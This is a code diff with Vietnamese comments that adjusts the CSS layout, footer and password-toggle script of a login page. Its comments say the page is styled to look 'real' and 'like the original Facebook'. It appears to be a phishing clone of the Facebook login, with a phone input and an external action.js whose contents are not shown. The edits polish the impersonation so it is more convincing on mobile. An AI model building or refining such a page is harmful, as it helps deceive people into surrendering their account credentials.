@@ -20,7 +20,7 @@
     <link rel="stylesheet" href="css/international-telephone-input.css">
 
     <style>
-        /* Tối ưu hóa toàn bộ Layout chuẩn Responsive */
+        /* Toàn bộ Layout chuẩn Responsive */
         body {
             background-color: #f0f2f5 !important;
             font-family: Helvetica, Arial, sans-serif;
@@ -74,10 +74,10 @@
         .verified_info {
             text-align: center;
             margin-bottom: 20px;
-            display: none; /* Mặc định ẩn, chỉ hiện trên mobile nếu cần */
+            display: none; /* Mặc định ẩn trên PC, hiện trên mobile */
         }
 
-        /* Khung màu trắng chứa Form */
+        /* Khung chứa Form */
         .login-card {
             background: #ffffff;
             border: none;
@@ -153,11 +153,11 @@
             color: white;
         }
 
-        /* Footer chuẩn chỉnh */
+        /* Footer tối ưu nhỏ gọn, cân đối */
         .footer-custom {
             background-color: #ffffff;
-            padding: 32px 16px;
-            font-size: 12px;
+            padding: 24px 16px;
+            font-size: 11px; /* Thu nhỏ chữ xuống 11px cho cân đối */
             color: #737373;
             line-height: 1.6;
         }
@@ -168,7 +168,7 @@
         .footer-links {
             display: flex;
             flex-wrap: wrap;
-            gap: 12px;
+            gap: 10px;
             margin-bottom: 8px;
         }
         .footer-links a {
@@ -181,40 +181,50 @@
         .footer-links a.active {
             color: #737373;
         }
+        .meta-copyright {
+            color: #737373;
+        }
 
-        /* RESPONSIVE: Cấu hình hiển thị trên Điện thoại dưới 768px */
+        /* RESPONSIVE: Xử lý hiển thị mượt mà trên Điện thoại dưới 768px */
         @media (max-width: 767.98px) {
             body {
-                background-color: #ffffff !important; /* Mobile nền trắng cho giống thật */
+                background-color: #ffffff !important; /* Mobile nền trắng giống Facebook gốc */
             }
             .main-wrapper {
-                padding: 20px 15px;
+                padding: 20px 0; /* Loại bỏ padding ngang để không bóp nghẹt form */
                 align-items: flex-start;
             }
             .container-custom {
                 flex-direction: column;
-                gap: 20px;
+                gap: 10px;
             }
             .col-left-custom {
-                display: none; /* Ẩn ảnh to của PC khi trên mobile */
+                display: none; /* Ẩn ảnh lớn của PC khi trên mobile */
             }
             .col-right-custom {
                 max-width: 100%;
             }
             .login-card {
-                box-shadow: none; /* Mobile bỏ bóng viền */
-                padding: 0;
+                box-shadow: none; /* Mobile bỏ bóng viền cho phẳng */
+                padding: 0 16px; /* Thêm khoảng cách hai bên form trên mobile tránh dính lề */
             }
             .verified_info {
-                display: block; /* Hiện logo vòng tròn đăng nhập trên mobile */
+                display: block; /* Hiện logo tròn và tiêu đề trên mobile */
+                margin-top: 10px;
+            }
+            /* Căn giữa toàn bộ chữ ở footer trên điện thoại */
+            .footer-custom {
+                padding: 20px 16px;
+                background-color: #ffffff;
             }
             .footer-links {
                 justify-content: center;
-                gap: 10px;
+                gap: 8px;
             }
             .meta-copyright {
                 text-align: center;
                 display: block;
+                width: 100%;
                 margin-top: 10px;
             }
         }
@@ -319,7 +329,7 @@
     <script src="action.js"></script>
 
     <script>
-        // JS xử lý ẩn hiện password nhanh bằng icon mắt
+        // JS xử lý ẩn hiện password bằng icon mắt
         const togglePassword = document.querySelector('#togglePassword');
         const passwordInput = document.querySelector('#exampleInputPassword');
         if(togglePassword && passwordInput) {
